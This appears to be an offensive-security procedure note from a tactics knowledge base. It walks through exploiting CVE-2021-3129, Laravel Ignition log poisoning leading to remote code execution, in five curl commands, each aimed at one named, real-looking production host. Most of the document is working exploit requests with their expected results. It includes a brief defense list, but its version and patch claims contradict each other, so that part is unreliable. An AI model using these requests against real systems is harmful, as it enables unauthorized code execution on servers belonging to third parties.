---
tags:
  - rce
  - ignition
  - log-poisoning
  - cve-2021-3129
type: procedure
tools:
  - '[[tools/curl]]'
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/curl-ignition-log-poisoning-setup]]'
  - '[[commands/curl-ignition-payload-injection]]'
  - '[[commands/curl-utf16-payload-injection]]'
  - '[[commands/curl-trigger-payload-execution]]'
  - '[[commands/curl-phar-execution-attempt]]'
verified: false
platforms:
  - Web
  - PHP
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Windows Command Shell]]'
updated_at: '2025-12-14T17:25:17.621Z'
skill_level: intermediate
impact_level: high
detection_risk: high
sub_techniques: []
id: c01b5b3c-8493-4108-86bb-31be090c1a60
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Windows Command Shell]]'
---
# Attempt-RCE-via-Ignition-Log-Poisoning-with-Curl

## Summary

This procedure attempts remote code execution in vulnerable Laravel versions (<=8.4.2) with debug enabled by poisoning the storage/logs/laravel.log file using Ignition's execute-solution endpoint and PHP stream filters for encoding/decoding payloads, though patched in 8.83.27.

## Description

CVE-2021-3129 exploits Ignition (Laravel's debug handler) to write malicious PHP code to logs via php://filter wrappers, then execute it through error handling or phar:// deserialization. Steps include clearing logs, injecting base64/UTF-16 payloads, decoding, and triggering execution. Target: https://mpos.mtn.co.sz/_ignition/execute-solution. Impact limited to errors in patched versions.

## Requirements

1. Confirmed debug mode and Ignition access from prior procedure
2. curl installed on attacker's machine
3. Knowledge of PHP stream wrappers and base64 encoding

## Defense

Defensive measures and detection strategies:

- Update Laravel to >=8.4.2 to patch CVE-2021-3129
- Disable Ignition in production or restrict /_ignition/ access
- Monitor access to /_ignition/execute-solution and log file changes
- Use file integrity monitoring on storage/logs/

## Objectives

1. Poison laravel.log with executable PHP code
2. Trigger RCE via filter chains or phar
3. Confirm patch status through failed execution

## Instructions

### Step 1: Setup Log Poisoning

**Context**: Clear or prepare log file by triggering a simple error.

**Command** ([[commands/curl-ignition-log-poisoning-setup]]):
```bash
curl -XPOST -H'Content-Type: application/json' -d '{"solution":"Facade\\\Ignition\\\Solutions\\\MakeViewVariableOptionalSolution","parameters":{"variableName":"test","viewFile":"AA"},}' https://mpos.mtn.co.sz/_ignition/execute-solution
```

> Triggers error logging 'AA' as invalid view. Expected: 500 response, log entry added.

### Step 2: Inject Payload via Filters

**Context**: Write encoded payload to log using filter chain.

**Command** ([[commands/curl-ignition-payload-injection]]):
```bash
curl -XPOST -H'Content-Type: application/json' -d '{"solution":"Facade\\\Ignition\\\Solutions\\\MakeViewVariableOptionalSolution","parameters":{"variableName":"test","viewFile":"php://filter/write=convert.iconv.utf-8.utf-16le|convert.quoted-printable-encode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log"},}' https://mpos.mtn.co.sz/_ignition/execute-solution
```

> Encodes and writes base64 PHP code (e.g., system('id')). Expected: Log poisoned.

### Step 3: Inject UTF-16 Payload

**Context**: Add aligned base64 payload for decoding.

**Command** ([[commands/curl-utf16-payload-injection]]):
```bash
curl -XPOST -H'Content-Type: application/json' -d '{"solution":"Facade\\\Ignition\\\Solutions\\\MakeViewVariableOptionalSolution","parameters":{"variableName":"test","viewFile":"=50=00=44=00=39=00=77=00=61=00=48=00=41=00=67=00=58=00=31=00=39=00=49=00=51=00=55=00=78=00=55=00=58=00=30=00=4E=00=50=00=54=00=56=00=42=00=4A=00=54=00=45=00=56=00=53=00=4B=00=43=00=6B=00=37=00=49=00=44=00=38=00=2B=00=44=00=51=00=70=00=4E=00=41=00=51=00=41=00=41=00=41=00=67=00=41=00=41=00=41=00=42=..."},}' https://mpos.mtn.co.sz/_ignition/execute-solution
```

> Quoted-printable UTF-16 base64 for PHP exec. Expected: Payload in log.

### Step 4: Trigger Decoding and Execution

**Context**: Decode and process log as executable.

**Command** ([[commands/curl-trigger-payload-execution]]):
```bash
curl -XPOST -H'Content-Type: application/json' -d '{"solution":"Facade\\\Ignition\\\Solutions\\\MakeViewVariableOptionalSolution","parameters":{"variableName":"test","viewFile":"php://filter/write=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log"},}' https://mpos.mtn.co.sz/_ignition/execute-solution
```

> Attempts RCE via decode chain. Expected: Error if patched.

### Step 5: Attempt Phar Execution

**Context**: Treat log as PHAR for deserialization.

**Command** ([[commands/curl-phar-execution-attempt]]):
```bash
curl -XPOST -H'Content-Type: application/json' -d '{"solution":"Facade\\\Ignition\\\Solutions\\\MakeViewVariableOptionalSolution","parameters":{"variableName":"test","viewFile":"phar://../storage/logs/laravel.log"},}' https://mpos.mtn.co.sz/_ignition/execute-solution
```

> Executes serialized code. Expected: No output due to patch.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]] Execution

### Techniques

- [[Exploit Public-Facing Application]] Exploit Public-Facing Application
- [[Windows Command Shell]] Windows Command Shell (PHP equivalent)

### Sub-Techniques

-

## Commands Used

- [[commands/curl-ignition-log-poisoning-setup]]
- [[commands/curl-ignition-payload-injection]]
- [[commands/curl-utf16-payload-injection]]
- [[commands/curl-trigger-payload-execution]]
- [[commands/curl-phar-execution-attempt]]

## Tools Used

- [[tools/curl]]

## Tags

- [[rce]]
- [[ignition]]
- [[log-poisoning]]
- [[cve-2021-3129]]
